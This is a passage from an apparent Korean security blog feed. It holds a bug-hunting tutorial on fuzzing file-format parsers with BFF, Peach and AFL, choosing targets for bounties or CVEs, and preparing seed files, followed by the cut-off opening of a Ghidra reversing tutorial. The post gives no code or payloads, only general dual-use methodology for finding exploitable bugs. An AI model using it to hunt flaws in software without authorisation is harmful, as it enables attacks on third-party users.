&#xBC29;&#xBC95;&#xC778;&#xB370;&#xC694;. &#xADF8;&#xB0E5; &#xB178;&#xAC00;&#xB2E4;&#xC785;&#xB2C8;&#xB2E4;. Untrust input&#xC744; &#xC9C1;&#xC811; &#xC190;&#xC73C;&#xB85C; &#xB123;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD574;&#xAC00;&#xBA74;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Untrust input &#xC774; &#xD30C;&#xC77C;&#xC77C; &#xB54C; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xAC00;&#xBA74;&#xC11C; &#xC9C1;&#xC811; &#xC218;&#xC815;&#xD574;&#xAC00;&#xBA74;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBCF4;&#xBA74; &#xBB54;&#xAC00; &#xC774; &#xC704;&#xCE58;&#xB294; &#xBB34;&#xC2A8; &#xC5ED;&#xD560;&#xC774;&#xB77C;&#xB294; &#xB290;&#xB08C;&#xC774; &#xC880; &#xC635;&#xB2C8;&#xB2E4;. (&#xC544;&#xB9C8;? &#xB514;&#xBC84;&#xAE45;&#xB3C4; &#xAC19;&#xC774; &#xD558;&#xBA74;&#xC11C; &#xC880; &#xB9CE;&#xC774; &#xC0BD;&#xC9C8;&#xD574;&#xC57C; &#xD558;&#xAE34; &#xD558;&#xC9C0;&#xB9CC;). &#xBB3C;&#xB860; &#xC774;&#xAC83;&#xB3C4; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC774; &#xB2E8;&#xC21C;&#xD560; &#xACBD;&#xC6B0;&#xC774;&#xAE30;&#xB294; &#xD558;&#xC9C0;&#xB9CC;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xBB38;&#xC11C; &#xD3EC;&#xB9F7;&#xC778; &#xACBD;&#xC6B0;&#xC5D0; &#xD30C;&#xC77C;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC55E;&#xC5D0; &#xC22B;&#xC790;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xC774;&#xAC8C; &#xB300;&#xCDA9; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xD3F0;&#xD2B8; &#xC815;&#xBCF4;&#xC774;&#xAC70;&#xB098; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xBC14;&#xB85C; &#xBCF4;&#xACE0; &#xC54C;&#xAC70;&#xB098; &#xBA87; &#xBC88;&#xC758; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xC8E0;. &#xC774;&#xB807;&#xAC8C; &#xD558;&#xB098;&#xD558;&#xB098; &#xC0BD;&#xC9C8;&#xC744; &#xD574;&#xAC00;&#xBA74;&#xC11C; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC5D0; &#xB300;&#xD55C; &#xC774;&#xD574;&#xB97C; &#xB192;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xC790;&#xAE30;&#xAC00; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xCE21;&#xC744; &#xD560; &#xC218; &#xC788;&#xACE0; &#xC778;&#xD48B;&#xC744; &#xC815;&#xD655;&#xD558;&#xAC8C; &#xC54C;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xBE44;&#xAD50;&#xC801; &#xD3B8;&#xD558;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC9C1;&#xC811; &#xC870;&#xC791;&#xC744; &#xD574;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2DC;&#xAC04;&#xC774; &#xB9CE;&#xC774; &#xB4E4;&#xACE0; &#xBAA8;&#xB4E0; &#xD3EC;&#xB9F7;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB294; &#xAC83;&#xB3C4; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xD30C;&#xC77C;&#xC774; &#xC555;&#xCD95;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xB77C;&#xBA74; &#xB354;&#xB354;&#xC6B1; &#xC774;&#xAC8C; &#xBB58; &#xD558;&#xB294;&#xC9C0; &#xC54C; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD37C;&#xC9D5; &#xD560; &#xB54C; &#xB354; &#xB9CE;&#xC774; &#xC4F0;&#xB294; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;</p><p>&#xB530;&#xB77C;&#xC11C; &#xC5B4;&#xCC28;&#xD53C; &#xADF8;&#xB0E5; &#xBBA4;&#xD14C;&#xC774;&#xC158;&#xC744; &#xD560;&#xAC70; &#xBCF4;&#xD1B5; &#xD37C;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD37C;&#xC9D5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xD37C;&#xC800;&#xC5D0;&#xC11C;&#xB294; &#xC8FC;&#xC5B4;&#xC9C4; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xC784;&#xC758;&#xB85C; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xACFC; &#xD06C;&#xB798;&#xC2DC; &#xD30C;&#xC77C; &#xADF8;&#xB9AC;&#xACE0; &#xD06C;&#xB798;&#xC2DC; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xC8E0;. &#xC800;&#xB3C4; &#xD37C;&#xC9D5;&#xC744; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD37C;&#xC800;&#xB97C; &#xC9C1;&#xC811; &#xC9DC;&#xB3C4; &#xB418;&#xC9C0;&#xB9CC; &#xACF5;&#xAC1C;&#xB41C; &#xBB34;&#xB8CC; &#xD37C;&#xC800;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;!!! &#x314E;&#x314E; &#xAC1C;&#xC774;&#xB4DD; BFF, Peach, AFL &#xB610; &#xADF8;&#xB9AC;&#xACE0;&#x2026; &#xBB50; &#xC788;&#xC5C8;&#xB354;&#xB77C;&#x2026; &#x314B;&#x314B;&#x314B; &#xAE30;&#xC5B5;&#xC774; &#xC798; &#xC548; &#xB098;&#xB294;&#xB370; &#xBB50; &#xC554;&#xD2BC; &#x314B;&#x314B;&#x314B;&#x314B; &#xC800;&#xB294; BFF&#xB97C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. BFF&#xB294; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.cert.org/vulnerability-analysis/tools/bff.cfm">https://www.cert.org/vulnerability-analysis/tools/bff.cfm</a></p><p>&#xC6D0;&#xB798; &#xC774;&#xB984;&#xC740; FOE &#xC600;&#xB294;&#xB370; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xBA74;&#xC11C; BFF&#xB85C; &#xC774;&#xB984;&#xC774; &#xBC14;&#xB00C;&#xC5C8;&#xB124;&#xC694; &#x314B;&#x314B; &#xCC38;&#xACE0;&#xB85C; &#xB180;&#xB780; &#xAC8C; &#xC6D0;&#xB798; FOE&#xAC00; &#xC708;&#xB3C4;&#xC6B0;&#xB9CC; &#xC9C0;&#xC6D0;&#xD588;&#xC5C8;&#xB294;&#xB370; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xBA74;&#xC11C; &#xB9E5;&#xC774;&#xB791; &#xB9AC;&#xB205;&#xC2A4;&#xB3C4; &#xC9C0;&#xC6D0;&#xD558;&#xAC8C; &#xB410;&#xB124;&#xC694;!! &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9E5;&#xC5D0;&#xC11C; &#xBA87; &#xAC1C; &#xB3CC;&#xB824;&#xBD24;&#xB294;&#xB370; &#xBB54;&#xAC00; &#xB354; &#xB9CE;&#xC774; &#xD130;&#xC9C0;&#xB294; &#xC774; &#xB290;&#xB08C;&#xC801;&#xC778; &#xB290;&#xB08C;&#x2026; &#xB098;&#xC911;&#xC5D0; &#xB9E5; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xB3C4; &#xD574;&#xBD10;&#xC57C;&#xACA0;&#xB124;&#xC694; &#x314B;&#x314B;&#x314B;</p><p>&#xC554;&#xD2BC; BFF &#xB4F1; &#xD37C;&#xC800;&#xC758; &#xC0AC;&#xC6A9;&#xBC95;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAC80;&#xC0C9;&#xB9CC; &#xD574;&#xB3C4; &#xB9CE;&#xC774; &#xB098;&#xC624;&#xB2C8; &#xC2A4;&#xD0B5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><h1 id="&#xD0C0;&#xAE43;-&#xC120;&#xC815;"><a href="#&#xD0C0;&#xAE43;-&#xC120;&#xC815;" class="headerlink" title="&#xD0C0;&#xAE43; &#xC120;&#xC815;"></a>&#xD0C0;&#xAE43; &#xC120;&#xC815;</h1><p>&#xD0C0;&#xAE43;&#xC744; &#xC120;&#xC815;&#xD558;&#xB294; &#xAC74; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;!! &#xC65C;&#xB0D0;!!! &#xD3EC;&#xC0C1; &#xAE08;&#xC561;&#xC774; &#xB2EC;&#xB77C;&#xC9C0;&#xB2C8;&#xAE4C;&#xC694;!!! &#xADF8;&#xB7FC; &#xBA85;&#xC608;&#xC758; &#xC804;&#xB2F9; &#xC21C;&#xC704;&#xAC00; &#xBCC0;&#xB3D9;&#xC774; &#xBCC4;&#xB85C; &#xC548;&#xB418;&#xB2C8;&#xAE4C;&#xC694;!!!!(&#xBB50; &#xB531;&#xD788; &#xC0C1;&#xAD00;&#xC740; &#xC5C6;&#xC9C0;&#xB9CC;) &#xC554;&#xD2BC; &#xD0C0;&#xAE43;&#xC744; &#xC120;&#xC815;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xBC84;&#xADF8; &#xD5CC;&#xD305;&#xC744; &#xD558;&#xB294; &#xBAA9;&#xC801;&#xC744; &#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB09C; &#xB3C8;&#xC744; &#xBC8C;&#xACE0; &#xC2F6;&#xB2E4;!!!! or &#xC81C;&#xB85C;&#xB370;&#xC774; &#xB9DB;&#xC774;&#xB77C;&#xB3C4; &#xBCF4;&#xACE0; &#xC2F6;&#xC5B4;&#xC694; &#x3160;&#x3160; &#xD558;&#xB098;&#xB9CC; &#xCC3E;&#xC544;&#xBCF4;&#xACE0; &#xC2F6;&#xC5B4;&#xC694; &#x3160;&#x3160;&#x3160;<ul><li>&#xADF8;&#xB7FC; &#xC27D;&#xACE0; &#xC775;&#xC2A4; &#xD558;&#xAE30; &#xC26C;&#xC6B4; &#xAC70; &#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xB9AC;&#xC5BC;&#xB8E8; &#xADF8;&#xB0E5; &#xB0A0;&#xB85C; &#xBA39;&#xC73C;&#xBA74;&#xC11C; &#xB3C8; &#xB9CE;&#xC774; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC880; &#xC788;&#xC5B4;&#xC694; &#x314B;&#x314B; &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C; &#xBCA4;&#xB354; &#xC774;&#xB984;&#xC740; &#xAE4C;&#xC9C0; &#xC54A;&#xB294; &#xAC78;&#xB85C;&#x2026; &#xC798; &#xCC3E;&#xC544;&#xBCF4;&#xC2DC;&#xBA74; &#xC740;&#xADFC;&#xD788; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xBAA8;&#xB4C8;&#xC5D0; Rebase, ASLR &#xC548; &#xAC78;&#xB824; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB3C4; &#xBD24;&#xC5B4;&#xC694; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;</li></ul></li><li>&#xB09C; &#xC9C0;&#xC2DD;&#xACFC; &#xBA85;&#xC608;&#xB97C; &#xC5BB;&#xACA0;&#xB2E4;!!!<ul><li>CVE&#xAC00; &#xB098;&#xC62C;&#xB9CC;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB77C;&#xB358;&#xAC00; &#xCEE4;&#xB110;&#xC774;&#xB77C;&#xB358;&#xAC00;&#x2026;. (&#xC544; &#xADFC;&#xB370; &#xC65C; &#xC694;&#xC0C8; &#xC8FC;&#xBCC0;&#xC5D0; &#xC708;&#xB3C4;&#xC6B0; &#xCEE4;&#xB110; &#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB9CE;&#xC544;&#xC9C4; &#xB290;&#xB08C;&#xC774;&#xC9C0; &#xB0B4;&#xAC00; &#xC2DC;&#xC791;&#xD558;&#xB824;&#xACE0; &#xD558;&#xB2C8;&#xAE4C; &#xC8FC;&#xBCC0;&#xC5D0;&#xC11C; &#xB2E4;&#xD558;&#xB124; &#xB2E4;&#xB4E4; &#xC708;&#xB3C4;&#xC6B0; &#xCEE4;&#xB110; &#xD558;&#xC9C0; &#xB9C8;&#xC148;)</li></ul></li><li>&#xADF8;&#xB7FC; &#xB098;&#xBA38;&#xC9C4; &#xBB50;&#xB0D0;!!!!<ul><li>&#xADF8;&#xB0E5; &#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;&#x2026;&#x2026;. &#xC2EC;&#xC2EC;&#xD574;&#xC11C; &#xD558;&#xB294; &#xAC70;&#xC608;&#xC694;&#x2026;&#x2026;.;;;</li></ul></li></ol><p>&#xC7A5;&#xB09C;&#xC774;&#xACE0; &#x314B;&#x314B;&#x314B; &#xC74C; &#xADF8;&#xB798;&#xC11C; &#xD0C0;&#xAE43;&#xC744; &#xB0B4;&#xAC00; &#xC544;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C;&#xB9CC; &#xD560; &#xAC83;&#xC774;&#xB0D0;?? &#x3134;&#x3134; &#xADF8;&#xAC74; &#xC544;&#xB2C8;&#xC8E0;</p><p><a href="http://software.naver.com/main.nhn">http://software.naver.com/main.nhn</a></p><p>&#xB124;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xC774;&#xB807;&#xAC8C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC790;&#xB8CC;&#xC2E4;&#xC744; &#xC6B4;&#xC601;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCF4;&#xAE09;&#xB3C4;&#xB098; &#xC774;&#xB7F0; &#xAC74; &#xC815;&#xD655;&#xD55C; &#xC218;&#xCE58;&#xB85C;&#xB294; &#xC548; &#xB098;&#xC640; &#xC788;&#xC9C0;&#xB9CC; &#xCD94;&#xCE21;&#xC740; &#xAC00;&#xB2A5;&#xD558;&#xC8E0; &#x314B;&#x314B; &#xC778;&#xAE30; &#xB9CE;&#xC740; &#xAC8C; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xB9CE;&#xC774; &#xC4F0;&#xB294; &#xAC70;&#xACA0;&#xC8E0;?? &#xB124;&#xC774;&#xBC84;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB2E4;&#xC74C;&#xC774;&#xB098; &#xB2E4;&#xB978; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C;&#xB3C4; &#xBE44;&#xC2B7;&#xD55C; &#xAC83;&#xB4E4;&#xC774; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xB7F0; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xCC3E;&#xC73C;&#xC2DC;&#xBA74; &#xB420; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xC2DC;&#xB4DC;-&#xD30C;&#xC77C;"><a href="#&#xC2DC;&#xB4DC;-&#xD30C;&#xC77C;" class="headerlink" title="&#xC2DC;&#xB4DC; &#xD30C;&#xC77C;"></a>&#xC2DC;&#xB4DC; &#xD30C;&#xC77C;</h1><p>&#xD37C;&#xC800;&#xC5D0;&#xC11C; &#xC591;&#xC9C8;&#xC758; &#xACB0;&#xACFC;&#xB97C; &#xB098;&#xC624;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC591;&#xC9C8;&#xC758; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xB123;&#xB294; &#xAC83;&#xB3C4; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;</p><p>&#xBA3C;&#xC800; &#xD0C0;&#xAE43; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC744; &#xD37C;&#xC9D5; &#xD560; &#xAC83;&#xC778;&#xC9C0; &#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBBF8;&#xB514;&#xC5B4; &#xD50C;&#xB808;&#xC774;&#xC5B4;&#xC758; &#xACBD;&#xC6B0;, &#xC74C;&#xC545;&#xC774;&#xB098; &#xB3D9;&#xC601;&#xC0C1;&#xC758; &#xD3EC;&#xB9F7;&#xB9CC; &#xACB0;&#xC815;&#xD558;&#xBA74; &#xB418;&#xAE34; &#xD558;&#xC9C0;&#xB9CC;(&#xADF8;&#xB807;&#xB2E4;&#xACE0;&#xB294; &#xD558;&#xC9C0;&#xB9CC; &#xBC84;&#xC804;&#xC774;&#xB098; &#xC555;&#xCD95; &#xBC29;&#xC2DD;, &#xC6B4;&#xC601;&#xBC29;&#xC2DD; &#xB4F1;&#xB4F1;&#xC758; &#xCC28;&#xC774;&#xB85C; &#xAE30;&#xB2A5;&#xC758; &#xCC28;&#xC774;&#xAC00; &#xC880; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC19;&#xC740; &#xD3EC;&#xB9F7;&#xC774;&#xB354;&#xB77C;&#xB3C4; &#xC0D8;&#xD50C;&#xC774; &#xB9CE;&#xC744;&#xC218;&#xB85D; &#xC88B;&#xC8E0;), &#xC6CC;&#xB4DC;&#xB098; &#xD55C;&#xAE00; &#xAC19;&#xC774; &#xAE30;&#xB2A5;&#xC774; &#xB9CE;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC740; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xD37C;&#xC9D5;&#xC744; &#xC9C4;&#xD589;&#xD560;&#xC9C0;&#xB97C; &#xACB0;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC548; &#xD558;&#xACE0; &#xADF8;&#xB0E5; &#xB9C9; &#xB9CC;&#xB4E4;&#xBA74; &#xB9AC;&#xBC84;&#xC2F1; &#xD560; &#xB54C; &#xD544;&#xC694; &#xC5C6;&#xB294; &#xBD80;&#xBD84; &#xB9AC;&#xBC84;&#xC2F1; &#xD558;&#xB290;&#xB77C; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#xD558;&#xAE30; &#xC77C;&#xC464;&#xC785;&#xB2C8;&#xB2E4; &#x3160;&#x3160; &#xB530;&#xB77C;&#xC11C; &#xBA3C;&#xC800; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC368;&#xBCF4;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xAD1C;&#xCC2E;&#xACA0;&#xB2E4; &#xC2F6;&#xC740; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098;&#xC5D0; &#xB300;&#xD55C; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xB530;&#xB85C; &#xC81C;&#xC791;&#xD558;&#xB294; &#xAC8C; &#xC81C;&#xC77C; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xC77C; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC740; &#xC9C1;&#xC811; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xC81C;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC9C1;&#xC811; &#xC81C;&#xC791;&#xD558;&#xBA74; &#xC548;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xB370;&#xB85C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD0C0;&#xAE43;&#xC774; &#xBA85;&#xD655;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1; &#xD560; &#xB54C; &#xD3B8;&#xB9AC;&#xD568;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C1;&#xC811; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC70;&#xB294; &#xB4A4;&#xC5D0;&#xC11C; &#xB610; &#xC598;&#xAE30;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC9C1;&#xC811; &#xB9CC;&#xB4E4;&#xAE30; &#xC560;&#xB9E4;&#xD558;&#xAC70;&#xB098; &#xADC0;&#xCC2E;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xAD6C;&#xAE00; &#xAC80;&#xC0C9;&#xC73C;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. Filetype&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xD3EC;&#xB9F7; &#xCC3E;&#xC544;&#xC11C; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><hr><p>Part 2&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xC81C;&#xBCF4;&#xD588;&#xB358; &#xBBF8;&#xB514;&#xC5B4; &#xD50C;&#xB808;&#xC774;&#xC5B4; KMPlayer&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC5D0; &#xB300;&#xD574; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</title>
    <link href="/2021/03/07/idioth/ghidra_part2/"/>
    <url>/2021/03/07/idioth/ghidra_part2/</url>
    
    <content type="html"><![CDATA[<p><strong>&#xB2E4;&#xB978; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 1 - Overview</a></p><p>Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 2 - Data, Functions, Scripts (Here!)</p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 3 - tips for IDA User</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 4 - Malware Analysis (1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 5 - Malware Analysis (2)</a></p><hr><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%201.png" alt></p><p>&#xD30C;&#xD2B8; 2&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC694;&#xC998; &#xB0A0;&#xC528;&#xAC00; &#xB9CE;&#xC774; &#xB530;&#xB73B;&#xD574;&#xC84C;&#xB124;&#xC694;. &#xCD5C;&#xADFC; &#xC81C;&#xAC00; &#xD558;&#xB358; &#xAC8C;&#xC784;<del>(&#xC720;&#xC0AC; &#xB3C4;&#xBC15;)</del>&#xC5D0;&#xC11C; &#xC774;&#xC288;&#xAC00; &#xD130;&#xC838;&#xC11C; &#xACF5;&#xC911;&#xD30C;&#xC5D0;&#xB3C4; &#xCD9C;&#xD604;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2C9;&#xB124;&#xC784;&#xB2F5;&#xAC8C; &#xC8FC;&#xC704;&#xC5D0;&#xC11C; &#xD558;&#xB294; &#xB9D0;&#xC744; &#xBB34;&#xC2DC;&#xD55C; &#xCC44; &#xC990;&#xAE30;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xBB50; &#xC544;&#xBB34;&#xD2BC; &#xC624;&#xB79C; &#xC2DC;&#xAC04; &#xC990;&#xACBC;&#xB358; &#xC785;&#xC7A5;&#xC774;&#xB77C; &#xB9C8;&#xC74C;&#xC774; &#xC544;&#xD504;&#xB124;&#xC694;. <del>&#xD639;&#xC2DC; &#xC800;&#xC640; &#xAC19;&#xC740; &#xAC8C;&#xC784;&#xC744; &#xD558;&#xC2DC;&#xB358; &#xBD84;&#xC774;&#xB77C;&#xBA74; &#xC783;&#xC5B4;&#xBC84;&#xB9B0; &#xC544;&#xD06C;&#xB97C; &#xCC3E;&#xC73C;&#xB7EC;</del></p><p>&#xB534; &#xC18C;&#xB9AC;&#xB294; &#xADF8;&#xB9CC;&#xD558;&#xACE0; <a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">&#xC800;&#xBC88; &#xD30C;&#xD2B8;</a>&#xC5D0;&#xC11C;&#xB294; ghidra&#xC5D0; &#xB300;&#xD55C; &#xC804;&#xBC18;&#xC801;&#xC778; &#xAC83;&#xC5D0; 